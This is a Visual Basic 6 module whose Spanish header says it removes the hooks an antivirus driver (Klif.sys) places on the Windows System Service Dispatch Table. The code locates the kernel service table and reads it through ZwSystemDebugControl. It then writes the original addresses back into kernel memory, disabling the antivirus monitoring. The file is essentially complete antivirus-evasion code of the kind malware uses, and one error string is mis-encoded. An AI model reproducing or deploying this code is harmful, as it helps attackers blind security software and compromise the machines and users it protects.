Attribute VB_Name = "mSSDTUnhook"
' -----------------------------------------------------------------------------------
' Modulo        : mSSDTUnhook
' Autor         : Iceboy
' Proposito     : Quitar el Hook A las Funciones nativas que estan hookeadas por
'                 el Antivirus en este caso el Klif.sys SSDT "System Service Dispatch Table
' -----------------------------------------------------------------------------------
Option Explicit

Private Declare Function GetModuleHandle Lib "Kernel32" Alias "GetModuleHandleA" ( _
ByVal lpLibFileName As String) As Long

Private Declare Sub CopyMemory Lib "Kernel32" Alias "RtlMoveMemory" ( _
ByVal pDst As Long, _
ByVal pSrc As Long, _
ByVal ByteLen As Long)

Private Declare Function lstrlen Lib "Kernel32" Alias "lstrlenA" ( _
ByVal lpString As Long) As Long

Private Declare Function LoadLibraryEx Lib "Kernel32" Alias "LoadLibraryExA" ( _
ByVal lpLibFileName As Long, _
ByVal hFile As Long, _
ByVal dwFlags As Long) As Long

Private Declare Function FreeLibrary Lib "Kernel32" ( _
ByVal hLibModule As Long) As Long

Private Declare Function GetProcAddress Lib "Kernel32" ( _
ByVal hModule As Long, _
ByVal lpProcName As String) As Long

Private Declare Function ZwQuerySystemInformation Lib "ntdll.dll" ( _
ByVal SystemInformationClass As SYSTEM_INFORMATION_CLASS, _
ByVal pSystemInformation As Long, _
ByVal SystemInformationLength As Long, _
ByVal pReturnLength As Long) As Long

Private Declare Function ZwSystemDebugControl Lib "ntdll.dll" ( _
ByVal ControlCode As SYSDBG_COMMAND, _
ByVal pInputBuffer As Long, _
ByVal InputBufferLength As Long, _
ByVal pOutputBuffer As Long, _
ByVal OutputBufferLength As Long, _
ByVal pReturnLength As Long) As Long

Public Enum SYSDBG_COMMAND
    SysDbgReadVirtualMemory = 8
    SysDbgWriteVirtualMemory = 9
End Enum

Private Enum SYSTEM_INFORMATION_CLASS
    SystemModuleInformation = 11
End Enum

Private Type IMAGE_DOS_HEADER
    e_magic As Integer
    Unused(0 To 57) As Byte
    e_lfanew As Long
End Type

Private Type IMAGE_NT_HEADER
    Signature As Long
    Unused1(0 To 15) As Byte
    SizeOfOptionalHeader As Integer
    Characteristics As Integer
    Magic As Integer
    Unused3(0 To 25) As Byte
    ImageBase As Long
    Unused4(0 To 23) As Byte
    SizeOfImage As Long
    Unused5(0 To 31) As Byte
    NumberOfRvaAndSizes As Long
    ExportTableRva As Long
    ExportTableSize As Long
    Unused6(0 To 31) As Byte
    RelocationTableRva As Long
    RelocationTableSize As Long
End Type

Private Type IMAGE_EXPORT_DIRECTORY
    Unused(0 To 11) As Byte
    name As Long
    Base As Long
    NumberOfFunctions As Long
    NumberOfNames As Long
    AddressOfFunctions As Long
    AddressOfNames As Long
    AddressOfOrdinals As Long
End Type

Private Type IMAGE_BASE_RELOCATION
    VirtualAddress As Long
    SizeOfBlock As Long
End Type

Private Type IMAGE_FIXED_ENTRY
    Offset As Long
    Type As Long
End Type

Private Type ModuleInformation
    Reserved(7) As Byte
    Base As Long
    Size As Long
    Flags As Long
    Index As Integer
    Unknown As Integer
    Loadcount As Integer
    ModuleNameOffset As Integer
    ImageName(255) As Byte
End Type

Private Type MEMORY_CHUNKS
    Address As Long
    pData As Long
    Length As Long
End Type

Private Const DONT_RESOLVE_DLL_REFERENCES As Long = 1
Private Const IMAGE_REL_BASED_HIGHLOW As Long = 3
Private Const IMAGE_FILE_RELOCS_STRIPPED As Integer = 1

Dim FuncName(1023) As String, Address1(1023) As Long, Address2(1023) As Long, ModuleName(1023) As String
Dim dwServices As Long, dwKernelBase As Long, dwKiServiceTable As Long



Public Sub RecoverSSDT(ByVal num As Long)
    Address2(num) = Address1(num)
End Sub

Public Sub WriteSSDT()
    Dim QueryBuff As MEMORY_CHUNKS, ReturnLength As Long
    With QueryBuff
        .Address = dwKiServiceTable + dwKernelBase
        .pData = VarPtr(Address2(0))
        .Length = dwServices * 4
        ZwSystemDebugControl SysDbgWriteVirtualMemory, VarPtr(QueryBuff), 12, 0, 0, VarPtr(ReturnLength)
        If ReturnLength <> .Length Then MsgBox "»Ö¸´Ê§°Ü!", vbCritical
    End With
End Sub

Private Function ModuleInformationFromPtr(ByVal pmi As Long) As ModuleInformation
    CopyMemory VarPtr(ModuleInformationFromPtr), pmi, 284
End Function

Private Function BaseRelocationFromPtr(ByVal pbr As Long) As IMAGE_BASE_RELOCATION
    CopyMemory VarPtr(BaseRelocationFromPtr), pbr, 8
End Function

Private Function FixedEntryFromPtr(ByVal pfe As Long) As IMAGE_FIXED_ENTRY
    Dim tmp As Integer
    CopyMemory VarPtr(tmp), pfe, 2
    FixedEntryFromPtr.Offset = tmp And 4095
    CopyMemory VarPtr(tmp), pfe + 1, 1
    FixedEntryFromPtr.Type = (tmp And 240) \ 16
End Function

Private Function DwordFromPtr(ByVal pdword As Long) As Long
    CopyMemory VarPtr(DwordFromPtr), pdword, 4
End Function

Private Function WordFromPtr(ByVal pword As Long) As Long
    CopyMemory VarPtr(WordFromPtr), pword, 2
End Function

Private Function FindKiServiceTable(ByVal hModule As Long, ByVal dwKSDT As Long) As Long
    Dim DosHeader As IMAGE_DOS_HEADER, NtHeader As IMAGE_NT_HEADER
    Dim pbr As Long, pfe As Long, bFirstChunk As Boolean, I As Long, forto As Long
    Dim dwFixups As Long, dwPointerRva As Long, dwPointsToRva As Long
    CopyMemory VarPtr(DosHeader), hModule, 64
    With DosHeader
        Assert .e_magic = &H5A4D
        CopyMemory VarPtr(NtHeader), hModule + .e_lfanew, 168
    End With
    With NtHeader
        Assert .Signature = &H4550
        Assert .Magic = &H10B
        Assert .SizeOfOptionalHeader >= 144
        Assert .NumberOfRvaAndSizes >= 6
        Assert .RelocationTableRva <> 0
        Assert ((.Characteristics And IMAGE_FILE_RELOCS_STRIPPED) = 0)
        pbr = .RelocationTableRva + hModule
    End With
    bFirstChunk = True
    Do While bFirstChunk Or CBool(BaseRelocationFromPtr(pbr).VirtualAddress)
        bFirstChunk = False
        pfe = pbr + 8
        forto = (BaseRelocationFromPtr(pbr).SizeOfBlock - 8) \ 2 - 1
        For I = 0 To forto
            If FixedEntryFromPtr(pfe).Type = IMAGE_REL_BASED_HIGHLOW Then
                dwFixups = dwFixups + 1
                dwPointerRva = BaseRelocationFromPtr(pbr).VirtualAddress + FixedEntryFromPtr(pfe).Offset
                dwPointsToRva = DwordFromPtr(hModule + dwPointerRva) - NtHeader.ImageBase
                If dwPointsToRva = dwKSDT Then
                    If WordFromPtr(hModule + dwPointerRva - 2) = &H5C7 Then
                        FindKiServiceTable = DwordFromPtr(hModule + dwPointerRva + 4) - NtHeader.ImageBase
                        Exit Function
                    End If
                End If
            End If
            pfe = pfe + 2
        Next
        pbr = pbr + BaseRelocationFromPtr(pbr).SizeOfBlock
    Loop
End Function

Private Function AddZero(ByVal Text As String, ByVal Length As Long) As String
    AddZero = String(Length - Len(Text), "0") & Text
End Function

Public Sub GetSSDT()
On Error Resume Next
    Dim I As Long, j As Long, Length As Long, Buff() As Byte, pKernelName As Long, hKernel As Long
    Dim dwKSDT As Long, pService As Long, DosHeader As IMAGE_DOS_HEADER, NtHeader As IMAGE_NT_HEADER
    dwServices = 0
    ZwQuerySystemInformation SystemModuleInformation, 0, 0, VarPtr(Length)
    ReDim Buff(Length - 1)
    ZwQuerySystemInformation SystemModuleInformation, VarPtr(Buff(0)), Length, 0
    With ModuleInformationFromPtr(VarPtr(Buff(4)))
        dwKernelBase = .Base
        pKernelName = VarPtr(.ImageName(0)) + .ModuleNameOffset
    End With
    hKernel = LoadLibraryEx(pKernelName, 0, DONT_RESOLVE_DLL_REFERENCES)
    dwKSDT = GetProcAddress(hKernel, "KeServiceDescriptorTable")
    Assert dwKSDT <> 0
    dwKSDT = dwKSDT - hKernel
    dwKiServiceTable = FindKiServiceTable(hKernel, dwKSDT)
    Assert dwKiServiceTable <> 0
    CopyMemory VarPtr(DosHeader), hKernel, 64
    With DosHeader
        Assert .e_magic = &H5A4D
        CopyMemory VarPtr(NtHeader), hKernel + .e_lfanew, 168
    End With
    With NtHeader
        Assert .Signature = &H4550
        Assert .Magic = &H10B
    End With
    pService = hKernel + dwKiServiceTable
    Do While DwordFromPtr(pService) - NtHeader.ImageBase < NtHeader.SizeOfImage
        Address1(dwServices) = DwordFromPtr(pService) - NtHeader.ImageBase + dwKernelBase
        pService = pService + 4
        dwServices = dwServices + 1
    Loop
    FreeLibrary hKernel
    Dim QueryBuff As MEMORY_CHUNKS, ReturnLength As Long
    With QueryBuff
        .Address = dwKernelBase + dwKiServiceTable
        .pData = VarPtr(Address2(0))
        .Length = dwServices * 4
    End With
    ZwSystemDebugControl SysDbgReadVirtualMemory, VarPtr(QueryBuff), 12, 0, 0, VarPtr(ReturnLength)
    Length = DwordFromPtr(VarPtr(Buff(0)))
    For I = 0 To Length - 1
        With ModuleInformationFromPtr(VarPtr(Buff(I * 284 + 4)))
            For j = 0 To dwServices - 1
                If Address2(j) >= .Base And Address2(j) < .Base + .Size Then
                    ModuleName(j) = StringFromPtr(VarPtr(.ImageName(0)))
                End If
            Next
        End With
    Next
        For I = 0 To dwServices - 1
            If Address1(I) <> Address2(I) Then
                RecoverSSDT I
                WriteSSDT
            End If
        Next
End Sub

Private Function StringFromPtr(ByVal pString As Long) As String
    Dim Buff() As Byte, Length As Long
    Length = lstrlen(pString)
    If Length = 0 Then Exit Function
    ReDim Buff(Length - 1)
    CopyMemory VarPtr(Buff(0)), pString, Length
    StringFromPtr = StrConv(Buff, vbUnicode)
End Function

Public Sub FindNtdllExport()
    Dim DosHeader As IMAGE_DOS_HEADER, NtHeader As IMAGE_NT_HEADER, ExportDirectory As IMAGE_EXPORT_DIRECTORY
    Dim I As Long, hNtdll As Long, FuncRVA() As Long, NameRVA() As Long, Ordinal() As Integer, ThisName As String, ThisNumber As Long
    hNtdll = GetModuleHandle("ntdll.dll")
    Assert hNtdll <> 0
    CopyMemory VarPtr(DosHeader), hNtdll, 64
    With DosHeader
        Assert .e_magic = &H5A4D
        CopyMemory VarPtr(NtHeader), hNtdll + .e_lfanew, 128
    End With
    With NtHeader
        Assert .Signature = &H4550
        Assert .Magic = &H10B
        Assert .SizeOfOptionalHeader >= 104
        Assert .NumberOfRvaAndSizes >= 1
        Assert .ExportTableSize >= 40
        CopyMemory VarPtr(ExportDirectory), hNtdll + .ExportTableRva, 40
    End With
    With ExportDirectory
        Assert StringFromPtr(.name + hNtdll) = "ntdll.dll"
        ReDim FuncRVA(.NumberOfFunctions - .Base), NameRVA(.NumberOfNames - 1), Ordinal(.NumberOfNames - 1)
        CopyMemory VarPtr(FuncRVA(0)), hNtdll + .AddressOfFunctions + .Base * 4, (.NumberOfFunctions - .Base) * 4
        CopyMemory VarPtr(NameRVA(0)), hNtdll + .AddressOfNames, .NumberOfNames * 4
        CopyMemory VarPtr(Ordinal(0)), hNtdll + .AddressOfOrdinals, .NumberOfNames * 2
        For I = 0 To .NumberOfNames - 1
            ThisName = StringFromPtr(hNtdll + NameRVA(I))
            If Left(ThisName, 2) = "Nt" Then
                ThisNumber = DwordFromPtr(FuncRVA(Ordinal(I) - .Base) + hNtdll + 1)
                If ThisNumber >= 0 And ThisNumber < .NumberOfNames Then
                    FuncName(ThisNumber) = ThisName
                End If
            End If
        Next
    End With
End Sub

Public Function ReadMemory(ByVal Address As Long, ByVal Length As Long) As Byte()
    Dim QueryBuff As MEMORY_CHUNKS, ReturnLength As Long, Buff() As Byte
    ReDim Buff(Length - 1)
    With QueryBuff
        .Address = Address
        .pData = VarPtr(Buff(0))
        .Length = Length
    End With
    ZwSystemDebugControl SysDbgReadVirtualMemory, VarPtr(QueryBuff), 12, 0, 0, VarPtr(ReturnLength)
    If ReturnLength = Length Then ReadMemory = Buff
End Function

Public Sub Assert(ByVal bBool As Boolean)
    If Not bBool Then
        MsgBox "Assertion Failed!", vbCritical, "Error"
        End
    End If
End Sub

